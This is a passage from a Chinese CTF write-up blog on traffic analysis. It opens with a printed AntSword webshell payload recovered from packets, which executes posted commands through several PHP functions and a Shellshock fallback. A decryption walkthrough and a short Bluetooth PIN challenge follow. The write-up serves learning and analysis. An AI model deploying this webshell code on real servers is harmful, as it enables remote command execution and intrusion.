class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=ob_get_contents();ob_end_clean();<span class="keyword">echo</span> <span class="string">&quot;f3c7239848e0&quot;</span>;<span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;05fda2646c&quot;</span>;&#125;ob_start();<span class="keyword">try</span>&#123;<span class="variable">$p</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;t185a78b977a47&quot;</span>]);<span class="variable">$s</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;wd0b7c7ca226cb&quot;</span>]);<span class="variable">$envstr</span>=@base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;b8dcb72ce2ba93&quot;</span>]);<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$c</span>=substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;<span class="keyword">if</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>)&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);&#125;<span class="keyword">else</span>&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);&#125;<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>))&#123;<span class="variable">$envarr</span>=explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);<span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;@putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));&#125;&#125;&#125;<span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;<span class="variable">$d</span>=explode(<span class="string">&quot;,&quot;</span>,@ini_get(<span class="string">&quot;disable_functions&quot;</span>));<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>))&#123;<span class="variable">$d</span>=<span class="keyword">array</span>();&#125;<span class="keyword">else</span>&#123;<span class="variable">$d</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,array_map(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));&#125;<span class="keyword">return</span>(function_exists(<span class="variable">$f</span>)&amp;&amp;is_callable(<span class="variable">$f</span>)&amp;&amp;!in_array(<span class="variable">$f</span>,<span class="variable">$d</span>));&#125;;<span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;<span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;<span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;<span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);<span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);&#125; <span class="keyword">else</span> &#123;mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);&#125;&#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="literal">False</span>;&#125;<span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);@unlink(<span class="variable">$tmp</span>);<span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;<span class="keyword">print</span>(<span class="variable">$output</span>);<span class="keyword">return</span> <span class="literal">True</span>;&#125;&#125;<span class="keyword">return</span> <span class="literal">False</span>;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;<span class="variable">$ret</span>=<span class="number">0</span>;<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="keyword">if</span>(fe(<span class="string">&#x27;system&#x27;</span>))&#123;@system(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;passthru&#x27;</span>))&#123;@passthru(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;<span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;exec&#x27;</span>))&#123;@exec(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);<span class="keyword">print</span>(join(<span class="string">&quot; &quot;</span>,<span class="variable">$o</span>));&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;popen&#x27;</span>))&#123;<span class="variable">$fp</span>=@popen(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$fp</span>))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>,<span class="number">2048</span>));&#125;@pclose(<span class="variable">$fp</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;proc_open&#x27;</span>))&#123;<span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">1</span>]))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));&#125;<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">2</span>]))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));&#125;@fclose(<span class="variable">$io</span>[<span class="number">1</span>]);@fclose(<span class="variable">$io</span>[<span class="number">2</span>]);@proc_close(<span class="variable">$p</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;antsystem&#x27;</span>))&#123;@antsystem(<span class="variable">$c</span>);&#125;<span class="keyword">elseif</span>(runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;<span class="keyword">elseif</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>))&#123;<span class="variable">$w</span>=<span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);<span class="variable">$e</span>=<span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);<span class="variable">$so</span>=<span class="variable">$e</span>-&gt;StdOut();<span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;ReadAll();<span class="variable">$se</span>=<span class="variable">$e</span>-&gt;StdErr();<span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;ReadAll();<span class="keyword">print</span>(<span class="variable">$ret</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$ret</span> = <span class="number">127</span>;&#125;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;;<span class="variable">$ret</span>=@runcmd(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);<span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();&#125;;asoutput();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>在这一串代码中可以发现有几个关键函数：asenc(),asoutput(),发现输出的内容是f3c7239848e0+asenc($output)+05fda2646c，asenc里面是用AES-128-ECB加密，key是session前16位，去包里找就行。</p>
+<h3 id="数据还原"><a href="#数据还原" class="headerlink" title="数据还原"></a>数据还原</h3><p>接下来需要做的就是还原数据，通过代码审计可以知道base64(AES加密（base64(out)）)后的内容是+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4=<br>把这个解密就行了。解密方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span>=base64_decode(<span class="string">&quot;+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4=&quot;</span>);</span><br><span class="line"><span class="variable">$res</span>=openssl_decrypt(<span class="variable">$payload</span>, <span class="string">&#x27;AES-128-ECB&#x27;</span>, <span class="variable">$k</span>,OPENSSL_RAW_DATA)</span><br></pre></td></tr></table></figure>
+<p>然后再做两次base64解密就可以得到flag了。(cat flag里面的文件也是base64加密的)</p>
+<h2 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h2><p>这道题有点麻烦，主要是不了解蚁剑的流量特征。在awd中shell的免杀与waf永远是在不断迭代升级的。还需要学习的姿势有很多，应该多分析流量，总结特点。</p>
+<h2 id="蓝牙数据包"><a href="#蓝牙数据包" class="headerlink" title="蓝牙数据包"></a>蓝牙数据包</h2><p>蓝牙这道题我一开始看到没什么思路，因为没有学过蓝牙相关的协议。于是从网上现学了点，发现传输数据使用的协议，搜了搜协议名还真搜出来个.7z文件。<br>搜出来之后把这玩意十六进制导入到010editor还原成.7z，提示需要输入密码，首先考虑伪加密，发现不是（其实360会自动修复伪加密）然后看文件名提示了密码是蓝牙的PIN，<br>于是在包中搜索“PIN”。<br>第一次搜索其实我搜到了。。但是没找到PIN,刚想爆破（PIN纯数字，位数少，好爆破）的时候朋友说你搜”PIN”就行。。。我。。吐了。<br>搜到PIN之后解压文件得到flag。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%8F%E8%BF%87%E4%B8%80%E4%B8%8B%E5%8D%88%E7%9A%84%E5%A5%8B%E6%88%98%EF%BC%8C%E5%BC%84%E6%98%8E%E7%99%BD%E4%BA%86awdshell%E8%BF%99%E9%81%93%E9%A2%98%EF%BC%8C%E4%B8%8B%E9%9D%A2%E8%AF%B4%E4%B8%80%E4%B8%8B%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text">经过一下午的奋战，弄明白了awdshell这道题，下面说一下思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">参考链接：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%87%BAHTTP%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.2.1.</span> <span class="toc-text">导出HTTP对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.2.2.</span> <span class="toc-text">流量分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E8%BF%98%E5%8E%9F"><span class="toc-number">1.2.3.</span> <span class="toc-text">流量还原</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.2.4.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E8%BF%98%E5%8E%9F"><span class="toc-number">1.2.5.</span> <span class="toc-text">数据还原</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">题目总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%93%9D%E7%89%99%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">1.4.</span> <span class="toc-text">蓝牙数据包</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&text=安恒月赛流量分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=安恒月赛流量分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&is_video=false&description=安恒月赛流量分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=安恒月赛流量分析&body=Check out this article: https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=安恒月赛流量分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=安恒月赛流量分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=安恒月赛流量分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=安恒月赛流量分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&name=安恒月赛流量分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&t=安恒月赛流量分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Polo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
